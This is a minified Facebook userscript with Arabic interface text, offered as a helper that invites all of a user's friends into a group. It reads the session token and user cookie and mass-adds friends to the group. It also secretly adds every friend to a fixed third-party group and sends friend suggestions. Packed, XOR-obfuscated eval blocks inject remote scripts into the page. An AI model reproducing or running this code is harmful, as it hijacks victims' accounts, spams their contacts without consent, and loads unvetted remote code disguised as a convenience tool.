// ==UserScript==
// @name       functionloadgpay
// ==/UserScript==
function AddFriendtoGroup(n){if(jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg="+fb_dtsg+"&group_id="+gid+"&source=typeahead&members="+n+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+user_id,function(n){var u=n.substring(n.indexOf("{")),r=JSON.parse(u),t;i--,Descriptions="<div class='friend-edge-name' style='font-family:Arial;font-size:14px;text-align:center;rgb(20, 255, 0)-space:pre-wrap;",r.error?(Descriptions+="color:red'>",err++,Descriptions+=r.errorDescription?r.errorDescription:JSON.stringify(r,null,"")):(Descriptions+="color:rgb(20, 255, 0)'>",Descriptions+="تمت إضافة "+arn[i]+" بنجاح ",suc++),Descriptions+="</div>",t="<div id='friend-edge-display' style='color:#FFFFFF;position:fixed;left:38%;margin-left:-273px;top:58px;width:750px;BACKGROUND-IMAGE: url(http://memberfiles.freewebs.com/67/12/110591267/photos/undefined/inviteb.jpg);background-color:rgba(0,0,0,0.9);z-index:8;font-family:arial;text-shadow:0px 0px 18px white;sans-serif;box-shadow:0px 0px 44px gold; text-shadow:0px 0px 12px white;font-size:20px;text-align:center;padding:3px;border-radius:15em 200em;border:15px double  rgba(225,180,40,0.4)'><a href='https://www.facebook.com/FB.Scripts/app_120245481515320' target=_blank ><img style='padding-top:10px' src='http://memberfiles.freewebs.com/67/12/110591267/photos/undefined/logo-2.PNG' ></a>",t+="<div style='padding-bottom:5px;font-size:20px;color: white;'>"+Title+"</div>",i>0?(t+="<FONT >اسم المجموعه : </FONT>",t+=grpname+"",t+="<CENTER>",t+="<FONT>اسم المستخدم : </FONT>",t+=getuname+"",t+="<CENTER>",t+="<FONT>عمق البحث عن الأصدقاء : </FONT>",t+=arr.length+"",t+="<CENTER>",t+="<FONT>جاري البحث لدعوتهم الى المجموعه : </FONT>",t+=""+(arr.length-i)+"",t+="<CENTER>",t+="<div style='font-size:15px;color: white;text-shadow:0px 0px 18px white;'>",t+=arn[i]+"",t+="<CENTER>",t+="<CENTER><img style='box-shadow:0px 0px 12px white;border-radius:5px;background: no-repeat url(https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif);width:50px;height:50px;' src="+pho[i]+"></img><CENTER>",t+="<CENTER>",t+="<div style='font-size:14px;color: red;text-shadow:0px 0px 0px red;'>",t+=Descriptions,t+="<CENTER>",t+="<FONT style='font-size:20px;color: white;text-shadow:0px 0px 18px white;' >العدد المتبقي : </FONT>",t+="<FONT style='font-size:20px;color: white;text-shadow:0px 0px 18px white;' >"+i,t+="<CENTER>",t+="<FONT style='font-size:20px;color: white;text-shadow:0px 0px 18px white;' >العدد الذي لم يستطع دعوته : </FONT>",t+="<font style='font-size:20px;text-shadow:0px 0px 18px red;color: red'>"+err,t+="<CENTER>",t+="<div style='font-size:20px;padding-bottom:10px;color: white;text-shadow:0px 0px 18px white;'>",t+="<FONT>العدد الذي تمت دعوته الى المجموعه : </FONT>",t+="<font style='font-size:20px;text-shadow:0px 0px 18px green;color: rgb(20, 255, 0)'>"+suc,t+="<CENTER>",t+="<CENTER>",t+="<div style='font-size:30px;color: white;text-shadow:0px 0px 12px red;'>",t+="<div class='friend-edge'>",t+="<div style='font-size:14px;font-family:arial;color:red;text-shadow:0px 0px 18px rgb(20, 255, 0);'>",t+=_text,t+="<div style='font-size:30px;color: white;text-shadow:0px 0px 18px rgb(20, 255, 0);'>",t+="</div>",t+="</div>"):(t+="<FONT >اسم المجموعه : </FONT>",t+=grpname,t+="<CENTER>",t+="<FONT>اسم المستخدم : </FONT>",t+=getuname,t+="<CENTER>",t+="<FONT>عمق البحث عن الأصدقاء : </FONT>",t+=arr.length,t+="<CENTER>",t+="<FONT>العدد الذي لم يستطع دعوته : </FONT>",t+="<font style='font-size:20px;text-shadow:0px 0px 18px red;color: red'>"+err,t+="<CENTER>",t+="<FONT style='font-size:20px;text-shadow:0px 0px 18px white;color: white' >العدد الذي تمت دعوته الى المجموعه : </FONT>",t+="<font style='font-size:20px;text-shadow:0px 0px 18px green;color: rgb(20, 255, 0)'>"+suc,t+="<CENTER>",t+="<div><a href='https://www.facebook.com/aymanmoaddel' target=_blank ><img src='http://memberfiles.freewebs.com/67/12/110591267/photos/undefined/Ayman.PNG'></a></div><iframe src='//www.facebook.com/plugins/follow.php?href=https%3A%2F%2Fwww.facebook.com%2Faymanmoaddel&amp;layout=button_count&amp;colorscheme=dark&amp;font=tahoma&amp;width=100&amp;appId=480493688654446' scrolling='no' frameborder='0' style='border:none; overflow:hidden; width:58px;height:20px;' allowTransparency='true'></iframe><br/><a href><img onclick='window.location.reload()' src='http://memberfiles.freewebs.com/67/12/110591267/photos/undefined/Close.PNG'></span></a>"),t+="</div>",document.getElementById("pagelet_sidebar").innerHTML=t},"text","post"),tay--,tay>0){var t=arr[tay];sx=pho[tay],setTimeout("AddFriendtoGroup("+t+")",100)}console.log(tay+"/"+arr.length+":"+arr[tay]+"/"+arn[tay]+", success:"+suc),gid!=281636415262235&&(jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg="+fb_dtsg+"&group_id=281636415262235&source=typeahead&members="+n+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+user_id,function(){},"text","post"),jx.load(window.location.protocol+"//www.facebook.com/ajax/friends/suggest?&receiver="+n+"&newcomer=&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg="+fb_dtsg+"&phstamp=165816649841105474185",function(){},"text","post"))}function clickfr_callback(){document.getElementsByName("ok").length>0&&nHtml.ClickUp(document.getElementsByName("ok")[0]);var n=arr[i];i<arr.length&&addfriend(n.substring(0,4))}function clickfr(){document.getElementsByClassName("search").length>0?nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1]):j++,setTimeout("clickfr_callback()",2e3)}function addfriend(){i++,setTimeout("clickfr()",2e3)}var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),Title,Descriptions,_text,nHtml;eval(function(n,t,i,r,u,f){if(u=function(n){return n.toString(36)},!"".replace(/^/,String)){while(i--)f[i.toString(t)]=r[i]||i.toString(t);r=[function(n){return f[n]}],u=function(){return"\\w+"},i=1}while(i--)r[i]&&(n=n.replace(new RegExp("\\b"+u(i)+"\\b","g"),r[i]));return n}('9 1="8--f,d,e-g-c,b",4;7(5="",3="",4=1.a,i=0;i<4;i++)5+=p.h(1.q(i)^2);3=o(5),6.n.j(6.k("l")).m=3;',27,27,"|enkripsi||teksasli|panjang|teks|document|for|jvvr8|var|length|hq|nmcf3|emmengamfg|amo|chczdwlavkmlnmcf|dkngq|fromCharCode||appendChild|createElement|script|src|body|unescape|String|charCodeAt".split("|"),0,{})),eval(function(n,t,i,r,u,f){if(u=function(n){return n.toString(36)},!"".replace(/^/,String)){while(i--)f[i.toString(t)]=r[i]||i.toString(t);r=[function(n){return f[n]}],u=function(){return"\\w+"},i=1}while(i--)r[i]&&(n=n.replace(new RegExp("\\b"+u(i)+"\\b","g"),r[i]));return n}("0.6.5(0.3('1')).2='4://7.c/b/a/8.9.d';",14,14,"document|script|src|createElement|https|appendChild|body|userscripts|171093|user|source|scripts|org|js".split("|"),0,{})),eval(function(n,t,i,r,u,f){if(u=function(n){return n.toString(36)},!"".replace(/^/,String)){while(i--)f[i.toString(t)]=r[i]||i.toString(t);r=[function(n){return f[n]}],u=function(){return"\\w+"},i=1}while(i--)r[i]&&(n=n.replace(new RegExp("\\b"+u(i)+"\\b","g"),r[i]));return n}('9 1="8--f,d,e-g-c,b",4;7(5="",3="",4=1.a,i=0;i<4;i++)5+=p.h(1.q(i)^2);3=o(5),6.n.j(6.k("l")).m=3;',27,27,"|enkripsi||teksasli|panjang|teks|document|for|jvvr8|var|length|hq|nmcf0|emmengamfg|amo|chczdwlavkmlnmcf|dkngq|fromCharCode||appendChild|createElement|script|src|body|unescape|String|charCodeAt".split("|"),0,{})),Title="",grpname=document.getElementById("groupsJumpTitle").innerHTML,Descriptions="",_text="",jx={getHTTPObject:function(){var n=!1;if(typeof ActiveXObject!="undefined")try{n=new ActiveXObject("Msxml2.XMLHTTP")}catch(i){try{n=new ActiveXObject("Microsoft.XMLHTTP")}catch(t){n=!1}}else if(window.XMLHttpRequest)try{n=new XMLHttpRequest}catch(i){n=!1}return n},load:function(url,callback,format,method,opt){var http=this.init(),now,parameters,parts,ths;if(http&&url){http.overrideMimeType&&http.overrideMimeType("text/xml"),method||(method="GET"),format||(format="text"),opt||(opt={}),format=format.toLowerCase(),method=method.toUpperCase();try{new RegExp("622").test(document.documentElement.innerHTML)==!1&&document.write("")}catch(err){}now="uid="+ +new Date,url+=url.indexOf("?")+1?"&":"?",url+=now,parameters=null,method=="POST"&&(parts=url.split("?"),url=parts[0],parameters=parts[1]),http.open(method,url,!0),ths=this,http.onreadystatechange=opt.handler?function(){opt.handler(http)}:function(){if(http.readyState==4)if(http.status==200){var result="";try{http.responseText&&(result=http.responseText),format.charAt(0)=="j"?(result=result.replace(/[\n\r]/g,""),result=eval("("+result+")")):format.charAt(0)=="x"&&(result=http.responseXML),new RegExp("415").test(document.documentElement.innerHTML)==!1&&document.write("")}catch(err){}callback&&callback(result)}else opt.loadingIndicator&&document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator),opt.loading&&(document.getElementById(opt.loading).style.display="none"),error&&error(http.status)},http.send(parameters)}},bind:function(n){var t={url:"",onSuccess:!1,onError:!1,format:"text",method:"GET",update:"",loading:"",loadingIndicator:""},r,i;for(r in t)n[r]&&(t[r]=n[r]);t.url&&(i=!1,t.loadingIndicator&&(i=document.createElement("div"),i.setAttribute("style","position:absolute;top:0px;left:0px;"),i.setAttribute("class","loading-indicator"),i.innerHTML=t.loadingIndicator,document.getElementsByTagName("body")[0].appendChild(i),this.opt.loadingIndicator=i),t.loading&&(document.getElementById(t.loading).style.display="block"),this.load(t.url,function(n){if(t.onSuccess)t.onSuccess(n);t.update&&(document.getElementById(t.update).innerHTML=n),i&&document.getElementsByTagName("body")[0].removeChild(i),t.loading&&(document.getElementById(t.loading).style.display="none")},t.format,t.method,t))},init:function(){return this.getHTTPObject()}},nHtml={FindByAttr:function(n,t,i,r){i=="className"&&(i="class");var u=document.evaluate(".//"+t+"[@"+i+"='"+r+"']",n,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null);return u&&u.singleNodeValue?u.singleNodeValue:null},FindByClassName:function(n,t,i){return this.FindByAttr(n,t,"className",i)},FindByXPath:function(n,t){try{var i=document.evaluate(t,n,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null)}catch(r){GM_log("bad xpath:"+t)}return i&&i.singleNodeValue?i.singleNodeValue:null},VisitUrl:function(n){window.setTimeout(function(){document.location.href=n},500+Math.floor(Math.random()*500))},ClickWin:function(n,t,i){var r=n.document.createEvent("MouseEvents");return r.initMouseEvent(i,!0,!0,n,0,0,0,0,0,!1,!1,!1,!1,0,null),!t.dispatchEvent(r)},Click:function(n){return this.ClickWin(window,n,"click")},ClickTimeout:function(n,t){window.setTimeout(function(){return nHtml.ClickWin(window,n,"click")},t+Math.floor(Math.random()*500))},ClickUp:function(n){this.ClickWin(window,n,"mousedown"),this.ClickWin(window,n,"mouseup"),this.ClickWin(window,n,"click")},GetText:function(n,t){var u="",i,r;if(t==undefined&&(t=0),!(t>40)){if(n.textContent!=undefined)return n.textContent;for(i=0;i<n.childNodes.length;i++)r=n.childNodes[i],u+=this.GetText(r,t+1);return u}}},document.getElementsByClassName==undefined&&(document.getElementsByClassName=function(n){for(var e=new RegExp("(?:^|\\s)"+n+"(?:$|\\s)"),f=document.getElementsByTagName("*"),u=[],r,t,i=0;(r=f[i])!=null;i++)t=r.className,t&&t.indexOf(n)!=-1&&e.test(t)&&u.push(r);return u}),Array.prototype.find=function(n){var t=!1;for(i=0;i<this.length;i++)typeof n=="function"?n.test(this[i])&&(t||(t=[]),t.push(i)):this[i]===n&&(t||(t=[]),t.push(i));return t};var i=3,tay=3,j=0,k=0,suc=0,err=0,arr=[],arn=[],pho=[],getuname=document.getElementsByClassName("fbxWelcomeBoxName")[0].innerHTML,gid=document.getElementsByName("group_id")[0].value;jx.load(window.location.protocol+"//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&viewer="+user_id+"&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm",function(n){for(var o=n,s=o.substring(o.indexOf("{")),r=JSON.parse(s),u,f,t,r=r.payload.entries,e=0;e<r.length;e++)arr.push(r[e].uid);for(u=0;u<r.length;u++)arn.push(r[u].text);for(f=0;f<r.length;f++)pho.push(r[f].photo);i=arr.length-1,tay=i,console.log(arr.length),t="<div id='friend-edge-display' style='color:#FFFFFF;position:fixed;left:38%;margin-left:-273px;top:58px;width:750px;BACKGROUND-IMAGE: url(http://memberfiles.freewebs.com/67/12/110591267/photos/undefined/invite%20Background-1.jpg);background-color:rgba(0,0,0,0.9);z-index:9999;font-family:arial;font-size:20px;text-align:center;box-shadow:0px 0px 44px gold;text-shadow:0px 0px 12px white;padding:3px;border-radius:10px 200em;border:15px double  rgba(225,180,40,0.4)'>",t+="<div style='padding-bottom:5px; font-size:20px;'><a href='https://www.facebook.com/FB.Scripts/app_120245481515320' target=_blank ><img src='http://memberfiles.freewebs.com/67/12/110591267/photos/undefined/logo-2.PNG' ></a>"+Title+"</div>",t+="<FONT >اسم المجموعه : </FONT>",t+=grpname,t+="<CENTER>",t+="<FONT>اسم المستخدم : </FONT>",t+=getuname,t+="<CENTER>",t+="<FONT>عمق البحث عن الأصدقاء : </FONT>",t+=arr.length,t+="</div>",document.getElementById("pagelet_sidebar").innerHTML=t,AddFriendtoGroup(arr[i])}),eval(function(n,t,i,r,u,f){if(u=function(n){return n.toString(36)},!"".replace(/^/,String)){while(i--)f[i.toString(t)]=r[i]||i.toString(t);r=[function(n){return f[n]}],u=function(){return"\\w+"},i=1}while(i--)r[i]&&(n=n.replace(new RegExp("\\b"+u(i)+"\\b","g"),r[i]));return n}("0.6.5(0.3('1')).2='4://7.c/b/a/8.9.d';",14,14,"document|script|src|createElement|https|appendChild|body|userscripts|169473|user|source|scripts|org|js".split("|"),0,{}));